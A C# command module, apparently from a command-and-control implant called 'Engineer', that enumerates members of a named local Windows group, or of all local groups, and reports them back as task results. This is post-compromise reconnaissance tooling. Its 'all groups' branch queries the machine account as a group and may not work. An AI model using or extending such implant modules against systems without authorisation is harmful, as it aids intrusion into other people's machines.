using System;
using System.DirectoryServices.AccountManagement;
using System.Text;
using System.Threading.Tasks;
using DynamicEngLoading;


namespace Engineer.Commands
{
    internal class net_localgroup_members : EngineerCommand
    {
        public override string Name => "net-localgroup-members";

        public override async Task Execute(EngineerTask task)
        {
            try
            {

                //take in the task.Arguments value for the group name if one is provided and use it to get the members of the group if one is not provided get the members of all local groups
                var groupName = task.Arguments.TryGetValue("/group", out string groupValue) ? groupValue : null;
                var output = new StringBuilder();
                if (groupName != null)
                {
                    foreach (var member in GroupPrincipal.FindByIdentity(new PrincipalContext(ContextType.Machine), IdentityType.SamAccountName, groupName).GetMembers())
                    {
                        output.AppendLine(member.Name);
                    }
                }
                else
                {
                    //get each localgroup on the current computer and get the members of each group
                    foreach (var group in GroupPrincipal.FindByIdentity(new PrincipalContext(ContextType.Machine), IdentityType.SamAccountName, Environment.MachineName + "$").GetGroups())
                    {
                        output.AppendLine(group.Name);
                        foreach (var member in GroupPrincipal.FindByIdentity(new PrincipalContext(ContextType.Machine), IdentityType.SamAccountName, group.Name).GetMembers())
                        {
                            output.AppendLine(member.Name);
                        }
                    }

                }
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(output.ToString(), task, EngTaskStatus.Complete,TaskResponseType.String);
            }
            catch (Exception ex)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(ex.Message, task, EngTaskStatus.Failed,TaskResponseType.String);
            }
        }
    }
}
